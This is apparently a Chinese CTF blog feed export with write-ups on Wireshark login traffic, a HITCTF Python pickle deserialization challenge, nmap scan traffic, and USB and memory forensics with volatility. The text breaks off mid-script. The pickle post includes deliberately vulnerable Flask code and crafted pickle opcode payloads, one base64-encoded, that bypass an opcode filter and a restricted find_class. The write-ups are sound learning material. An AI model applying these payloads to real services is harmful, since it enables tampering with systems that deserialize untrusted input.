      <url>2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识：wireshark基本操作"><a href="#预备知识：wireshark基本操作" class="headerlink" title="预备知识：wireshark基本操作"></a>预备知识：wireshark基本操作</h1><h2 id="题目分析：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案-注意：得到的-flag-请包上-flag-提交"><a href="#题目分析：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案-注意：得到的-flag-请包上-flag-提交" class="headerlink" title="题目分析：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交"></a>题目分析：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交</h2><p>打开数据包首先考虑登录页面，往下稍微翻了一下就看到了一个意思登录页面（编号20） 是向user.php提交数据，盲猜登陆界面。<br>然后追踪流-TCP流，即可看到密码。</p><h2 id="这应该是第一道秒的题-太菜了。"><a href="#这应该是第一道秒的题-太菜了。" class="headerlink" title="这应该是第一道秒的题 太菜了。"></a>这应该是第一道秒的题 太菜了。</h2>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pickle反序列化初步学习</title>
      <link href="2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识：python、pickle、stack、面向对象基础"><a href="#预备知识：python、pickle、stack、面向对象基础" class="headerlink" title="预备知识：python、pickle、stack、面向对象基础"></a>预备知识：python、pickle、stack、面向对象基础</h1><p>致敬：<a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a><br>注意：此篇文章需先通读文章链接中的一些基础概念，否则理解起来可能存在困难，在对例题进行讲解的过程中不会<strong>过多</strong>阐述基础概念。</p><h2 id="BB几句"><a href="#BB几句" class="headerlink" title="BB几句"></a>BB几句</h2><p>其实之前没怎么接触过python pickle模块的反序列化，或者说没接触过反序列化，这次”高校抗疫”CTF线上赛给我上了一课。<br>有一道webtmp的题目，是与python pickle模块的反序列化有关，我也找到了非常详细的解析(致敬部分已贴出)，但是没有沉下心认真地去一步步地做，所以这道题也没有做出来，其实这道题不难，做出来的师傅还是很多的。<br>相反，内存取证的一道题我根据教程一步步做出来了，也可能是之前web没做出来过题导致了这个结果。还需努力！</p><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>建议<strong>通读</strong> 致敬文章。<br>需要明确的概念：<br>数据结构–栈。<br>python数据类型：list、tuple、dict <a href="https://zhuanlan.zhihu.com/p/59740559">Python中list（列表）、dict（字典）、tuple（元组）、set（集合）详细介绍</a><br>pickle、pickletools ：详见致敬部分链接。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="第一题："><a href="#第一题：" class="headerlink" title="第一题："></a>第一题：</h3><p><img src="/img/181.png"><br>题目链接：<a href="http://web.hitctf.cn:10018/">HITCTF</a><br>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> pickletools,sys</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, category</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = pickle.loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(favorite.name, favorite.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something wrong...&#x27;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;kitty&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>题目的要求是,传入一个经过base64加密的pickle序列化后的字符串，在服务器端对该字符串进行解析，如果不包含R指令码并且解析后的对象类型为Animal，并且与其规定的<strong>favorite</strong>对象的name与category属性都一样的话，则可获得flag。<br>对代码进行审计，观察第34行，过滤了R指令码，即堵上了RCE这条路。<br>继续分析，发现并没有重写find_class方法，即可以通过引入favorite.name 和favorite.category的方法通过判定。<br>即：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">o1=Animal()</span><br><span class="line">o1.name=favorite.name</span><br><span class="line">o1.category=favorite.category</span><br></pre></td></tr></table></figure><p>这样构造的对象可以保证通过**correct = (result == Animal(favorite.name, favorite.category))**这句代码的判定。<br>接下来的问题是构造这种对象。<br>通过对指令码的学习，我们可以构造出这种对象。首先构造正常的animal对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,pickletools</span><br><span class="line">o1=Animal(<span class="string">&#x27;xx&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>)</span><br><span class="line">normal=pickle.dumps(o1)<span class="comment">#这是正常animal经序列化后的数据,</span></span><br><span class="line">ser=<span class="string">b&#x27;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x02\x00\x00\x00xxq\x04X\x08\x00\x00\x00categoryq\x05X\x02\x00\x00\x00yyq\x06ub.&#x27;</span><span class="comment">#这是序列化之后的数据（字符串形式）其实就是normal，我把它打印出来了。</span></span><br><span class="line">pickletools.dis(normal)</span><br><span class="line"><span class="comment">#下面为pickletools.dis(normal)的结果</span></span><br><span class="line"><span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;__main__ Animal&#x27;</span></span><br><span class="line">   <span class="number">19</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">21</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">22</span>: \x81 NEWOBJ</span><br><span class="line">   <span class="number">23</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">25</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">26</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">28</span>: (    MARK</span><br><span class="line">   <span class="number">29</span>: X        BINUNICODE <span class="string">&#x27;name&#x27;</span></span><br><span class="line">   <span class="number">38</span>: q        BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">40</span>: X        BINUNICODE <span class="string">&#x27;xx&#x27;</span></span><br><span class="line">   <span class="number">47</span>: q        BINPUT     <span class="number">4</span></span><br><span class="line">   <span class="number">49</span>: X        BINUNICODE <span class="string">&#x27;category&#x27;</span></span><br><span class="line">   <span class="number">62</span>: q        BINPUT     <span class="number">5</span></span><br><span class="line">   <span class="number">64</span>: X        BINUNICODE <span class="string">&#x27;yy&#x27;</span></span><br><span class="line">   <span class="number">71</span>: q        BINPUT     <span class="number">6</span></span><br><span class="line">   <span class="number">73</span>: u        SETITEMS   (MARK at <span class="number">28</span>)</span><br><span class="line">   <span class="number">74</span>: b    BUILD</span><br><span class="line">   <span class="number">75</span>: .    STOP</span><br></pre></td></tr></table></figure><p>根据思路，只需要把40 64标号处的值替换为favorite.name、favorite.category即可。<br>方法：使用c(global)指令引入我们所需的数据。即把’xx’ 通过c指令换成favorite.name，’yy’换成favorite.category<br>实现：把ser中xx与yy的编码使用golbal favorite.xx替换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03cfavorite\nname\nq\x04X\x08\x00\x00\x00categoryq\x05cfavorite\ncategory\nq\x06ub.&#x27;</span></span><br></pre></td></tr></table></figure><p>Then,encode it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>最终结果:<br>gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu</p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>题目链接：<a href="http://web.hitctf.cn:10018/">HITCTF</a><br>题目源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> favorite</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, category</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(favorite.name, favorite.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something wrong&quot;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;kitty&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目分析：相比上一个题，该题多了一个find_class方法的重写。规定了module只能是main中的，所以就无法引入favorite了。<br>解题思路：<br>通过__main__.blue引入这一个module，由于命名空间还在main内，故不会被拦截。<br>然后修改当前引入对象的属性，自定义即可。<br>然后把这个对象弹出，再压入一个正常的animal对象。注意：该正常对象的属性值须与你刚才设定的属性值相同。<br>payload=b’\x80\x03c__main__\nfavorite\n}(X\x04\x00\x00\x00nameX\x02\x00\x00\x00xxX\x08\x00\x00\x00categoryX\x02\x00\x00\x00yyub0c__main__\nAnimal\n)\x81}(X\x04\x00\x00\x00nameX\x02\x00\x00\x00xxX\x08\x00\x00\x00categoryX\x02\x00\x00\x00yyub.’<br>经过base64加密后提交即可。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这类问题只能说初步了解，具体还有很多细节没有弄明白。还需要进一步学习。<br>最后一道题的payload在写完favorite\n后压入一个空dict后，把当前栈这个整体，作为一个list，压进前序栈（opcode: (（ 也就是MARK操作符））。之后的操作就是更新favorite.name 和favorite.category分别为xx 和yy。对应X\x04\x00\x00\x00nameX\x02\x00\x00\x00xxX\x08\x00\x00\x00categoryX\x02\x00\x00\x00yy。<br>然后u就是形成键值对，b-build，把当前键值对的值给前序栈中的对象。这样前半部分的操作就完成了。对该对象修改完之后直接弹出(opcode : 0)，不管他了，然后再插一个正经对象，属性值一样就OK。</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三条命令</title>
      <link href="2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/"/>
      <url>2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识-wireshark、SYN、TCP、HTTP"><a href="#预备知识-wireshark、SYN、TCP、HTTP" class="headerlink" title="预备知识 wireshark、SYN、TCP、HTTP"></a>预备知识 wireshark、SYN、TCP、HTTP</h1><p>参考、致敬:<a href="https://blog.csdn.net/lhorse003/article/details/71758812">WireShark教程 – 黑客发现之旅(5) – (nmap)扫描探测</a></p><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>那到手的文件啥也不是，文件名zip，考虑压缩文件。<br>解压后得到一数据包，用wireshark打开</p><h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><p>常规追踪了一下TCP流、HTTP流、导出对象，并没有什么收获。<br>接下来分析题目，说是扫描端口，结合HTTP导出对象中的nmap字样，猜测是NMAP扫描。<br>结合参考中的链接，可以推测扫描方式为全连接扫描。<br>通过对特征字段的分析，发现端口存在的数据包返回的TSecr字段的值不为0，则可以根据此找出开放的端口。<br>按ctrl+f弹出上方搜索框，选择字符串，搜索TSecr=4799。<br><img src="/img/bumiscsantiao.png"></p><h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题其实不太难，懂得扫描方式可以把这题秒了，但是我8太懂，还是现百度的。事实证明考高分没用，重要的是实践！</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>usb&amp;内存取证</title>
      <link href="2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="预备知识：wireshark流量分析、binwalk、内存取证、USB、volatility-、strings、grep"><a href="#预备知识：wireshark流量分析、binwalk、内存取证、USB、volatility-、strings、grep" class="headerlink" title="预备知识：wireshark流量分析、binwalk、内存取证、USB、volatility 、strings、grep"></a>预备知识：wireshark流量分析、binwalk、内存取证、USB、volatility 、strings、grep</h1><p>参考、致敬：<a href="https://blog.csdn.net/MOLLMY/article/details/100679762">CTF 内存取证 USB流量分析</a></p><h2 id="附件分析"><a href="#附件分析" class="headerlink" title="附件分析"></a>附件分析</h2><p>拿到附件后，只有一个数据包文件。不用想，直接用wireshark打开分析一波。<br>##文件分析<br>这玩意确实挺大的，首先考虑包含了文件，使用kali linux 下的工具binwalk分析一波。<br>但是binwalk出来的附件在解压时都损坏了，此路不通。<br>继续分析我们的流量包，追踪http协议。<img src="/img/u1.png"><br>发现了巨大的包，可能有附件，于是在wireshark中导出http对象。（左上角文件-导出对象-http）<br>接下来观察导出的文件<img src="/img/u2.png"><br>有两个一样的较大的php文件，考虑文件包含。再次丢到binwalk里面分析一波。<br>果不其然，分离出了data.vmem文件。可以理解为vmem文件保存了当时内存中的数据，以支持在虚拟机中的暂停功能。<br>接下来用内存分析工具volatility 分析data.vmem<br>使用方法： volatility  -f filename imageinfo //查看镜像信息。<br>通过imageinfo 可以确定，镜像为WinXPSP2x86或者WinXPSP3x86.（影响不大）<br>接下来使用命令 volatility -f data.vmem –profile=WinXPSP2x86 filescan 扫描内存中的文件<img src="/img/u3.png"><br>可以看到有一堆文件。由于是ctf比赛，尝试过滤文件：比赛名称xctf或者flag 即<br>volatility -f data.vmem –profile=WinXPSP2x86 filescan |grep flag<br>volatility -f data.vmem –profile=WinXPSP2x86 filescan |grep xctf]<br>通过过滤flag 我们找到了flag.img文件。<a href="/img/u4.png"></a></p><h2 id="DUMP-IT"><a href="#DUMP-IT" class="headerlink" title="DUMP IT!"></a>DUMP IT!</h2><p>接下来需要做的事将flag.img 导出。<br>使用命令 volatility -f data.vmem –profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -D ./<br>将文件导出至当前目录。<a href="/img/u5.png"></a><br>导出文件为二进制格式。<br>接下来继续binwalk分析。<br>可以得到一个压缩包，压缩包里包含了加密的usb.txt文件。下一步就是获取加密的密码。<br>在尝试爆破的同时，继续进行内存取证分析。<br>通过volatility工具的子命令 hivelist 可以获得内存中的注册表信息，cmdscan查看cmd操作，connscan查看网络连接，pslist查看进程。<br>通过cmscan我们可以发现提示了密码：<img src="/img/u6.png"><br>尝试将该密码作为文件的解压密码（使用360解压，可以自动修复文件）—-成功！<br>现在获得了敲击码，接下来就是将敲击码转换为字符。<br>使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">&quot;aA&quot;</span>, <span class="number">0x05</span>:<span class="string">&quot;bB&quot;</span>, <span class="number">0x06</span>:<span class="string">&quot;cC&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;dD&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;eE&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;fF&quot;</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">&quot;gG&quot;</span>, <span class="number">0x0B</span>:<span class="string">&quot;hH&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;iI&quot;</span>, <span class="number">0x0D</span>:<span class="string">&quot;jJ&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;kK&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;lL&quot;</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span 